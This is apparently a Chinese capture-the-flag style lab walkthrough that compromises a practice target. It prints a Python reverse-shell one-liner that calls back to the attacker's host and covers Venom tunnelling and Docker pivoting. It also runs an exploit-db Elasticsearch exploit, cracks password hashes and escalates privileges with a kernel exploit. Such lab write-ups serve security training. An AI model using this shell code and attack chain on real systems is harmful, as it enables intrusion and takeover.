                        return "http"
    路径扫描在测试中感觉时候会有出乎意料的效果，运气好的话扫描出源代码文件，找到后台路径，找到一些有漏洞的功能页面等等。此次打靶过程中，扫描到了一个关键目录：/admin 访问发现是一个管理页面，通过提示可以看到这是一个可以通过exec()函数执行python代码的页面，我们也将通过这个页面获得靶机的权限。
# 0x5代码注入
    工具：nc  # 下载地址：https://eternallybored.org/misc/netcat
    命令：nc -lvvp 2333
    nc全名叫netcat，也叫他瑞士军刀，非常强大，linux自带，但是linux的新一点的版本 -e 参数好像用不了，出于对安全的考虑。
    常用参数：发起连接：nc ip port 
            监听端口：nc -lvvp port
            -l： 开启监听
            -p：指定端口
            -e：程序重定向，这个参数对于反弹shell非常有用
            -v：显示执行命令过程，简单点说就是会显示更加详细的信息，建议加上
    当访问靶机web的/admin页面后，发现了一个可以执行python代码的功能点，这里就存在一个python任意代码执行漏洞，我们接下来要做的就是通过执行python代码，然后反弹一个shell到我们的kali上面，这样就初步拿到了一个权限，然后通过这个shell做下一步的操作。
    通过网络上找到python反弹shell代码，需要修改IP和端口为我们kali主机监听的端口，提前在kali上开启端口监听：nc -lvvp 2333,kali的ip为：192.168.63.246
    import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.63.246",2333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
    这里放上一个收集了很多命令执行代码的网站，同时这个网站还有其他的丰富的资源：https://forum.ywhack.com/shell.php
# 0x6Docker容器的判断
    拿到shell后，发现自己是root权限，如果是真的，那肯定非常高兴，都不用提权了，但是对于这个靶场，并不会这么简单。docker作为一种非常强大的技术，渗透过程中也是经常遇到，这个靶场就使用docker，我们此时获得的权限是一个docker虚拟机的权限，这里主要说明如何判断自己拿到的是不是一个docker：
        1.根目录下是否存在：.dockerenv文件：ls /.dockerenv文件  90%是docker
        2.cat /proc/1/cgroup文件，如果这个文件里面有***/docker/一串字符,有这样的内容时，那么百分之百时docker文件
docker主机：cat /proc/1/cgroup 可以看到有docker关键字
linux物理机：cat /proc/1/cgroup 则没有docker关键字
kali  
Ubuntu  
centos  
# 0x7内网穿透
    工具：venom  #  https://github.com/Dliv3/Venom
    命令：服务端(kali)： ./admin_linux_x64 -lport 9999 
                      当客服端连接上来后，服务端需要执行的命令
                      show   # 显示当前连接上来的节点
                        goto 1   #  进入靶机的节点
                        socks 1080  #  启动1080端口的socket代理，后面kali设置代理的时候，就设置：127.0.0.1 1080
        客服端(靶机)：./agent_linux_x64 -rhost 192.168.63.246(kali-ip) -rport 9999(服务端监听的端口)
    使用：
        使用kali的proxychains工具  # https://github.com/haad/proxychains
        vim /etc/proxychains4.conf 
        最下方修改：socks5 127.0.0.1 1080
        使用：在要使用的工具前面加上：proxychains即可：如：proxychains  nmap -pn -sT 172.17.0.1
    当我们发现是docker的时候，首先考虑的应该是想办法docker逃逸，但是这个靶场想要考察的内容估计不是这个方向，所以对docker网段做了一个初步信息收集发现，还存在其他docker虚拟机，于是做内网穿透，对docker所在的网段的其他主机进行更加细致的扫描。venom客户端上传到靶机的这一步，我通过kali的python3 -m http.server 80 开启了一个临时的web服务，然后在dokcer的shell中通过wget http://192.168.63.246/agent_linux_x64 将客户端工具下载到靶机docker中，并赋权运行。
开启web服务
启动服务端
靶机下载客户端并启动连接服务端
客户端连接上后，进入客服端节点，并启动代理
最后修改proxychains4.conf配置文件
# 0x8内网信息收集+漏洞利用
    docker内网的信息收集主要通过proxychains代理软件和nmap工具来扫描内部网络
    命令：proxychains  nmap -pn -sT 172.17.0.0/24  #  不能用ping，原因是代理是socks5,是传输层的，而ping的icmp协议是网络层的，ping的数据无法通过代理访问到目标网络，所以这里只是用tcp探测来扫描主机。
         proxychains  nmap -pn -p- 172.17.0.2
    通过代理进行扫描，发现 172，17，0.2的9200端口存在http服务，并且知道这个web服务使用了elasticsearch，刚开始看到这个扫描结果的时候只是感觉这个是一个web服务，对后面的elasticsearch完全没有感觉，通过搜索引擎发现这是一个数据分析和搜索的引擎，并且还存在一个可以getshell的漏洞，通过这些信息，可以先把关注点放在这个elasticsearch上面，或许可以通过这个直接获得权限
    在kali中输入：searchsploit elasticsearch 看看是否有现成得exp，如果没有，就考虑去github或者是其他平台寻找一下。这里我们成功搜索到了exp，并把他复制出来
    cp /usr/share/exploitdb/exploits/linux/remote/36337
    执行这个脚本
    proxychains 36337.py 172.17.0.2
搜索到漏洞利用代码
开始利用漏洞
# 0x9密码破解
    当拿到新的一台docker虚拟机后，便开始查找时候有重要的敏感文件做进一步的信息收集，最终在/passwords文件中发现了一串特殊的字符串，类似几个账号和密码hash值，通过在线网站，对每个hash进行破解，最终只有：john/1337hack  这个账号密码有作用，并用这个账号成功登录了物理靶机的ssh服务。
    常用的破解md5加密的网站
    https://www.cmd5.com/
网站破解md5
通过破解出来的账号密码连接靶机的22端口
# 0xA本地提权
    接下里就是linux提权的操作，通过: uname -a 可以获得当前靶机的版本为 linux 3.13 ，通过 searchsploit linux 3.13 搜索kali本机是否有提权相关的exp，结果是成功找到了可以使用的，c语言源代码
    复制出来
    cp  /usr/share/exploitdb/exploits/linux/local/37292.c 37292.c
    对源代码进行查看，发现内部调用了gcc对一个c源码文件进行了编译，但是当前靶机内没有gcc这个工具，并且当前的环境不能够安装gcc，所以最后还是采用了修改源代码的方法，将调用gcc编译的部分源代码进行删除，然后我们在kali机上手动编译exp源代码和源代码中调用gcc编译的那个文件，最后我们会获得两个文件，一个就是exp提权文件，另外一个是exp运行过程中需要使用的一个编译好的文件，通过kali开启web服务，将两个文件都下载到靶机中，运行，提权成功。
搜索到提权exp
发现靶机没有gcc
阅读提权源代码，发现需要调用gcc
删除调用gcc的部分源代码后进行编译
找到源代码中调用gcc编译的那个源代码文件的编译好的文件
将exp和ofs-lib.so一起上传到靶机/tmp目录下
最后执行exp获得root权限
# 总结
    本次打靶过程：扫描发现5000端口 -> 服务探测发现web服务 -> 网站路径扫描发现管理页面 -> 利用代码执行获取shell -> 判断docker容器 -> 做内网穿透开始探测内网 -> 发现同网段docker容器漏洞并利用获取shell -> 信息收集找到普通用户密码 -> 在线网站密码破解登录靶机ssh服务 -> 最后利用提权exp成功获得root权限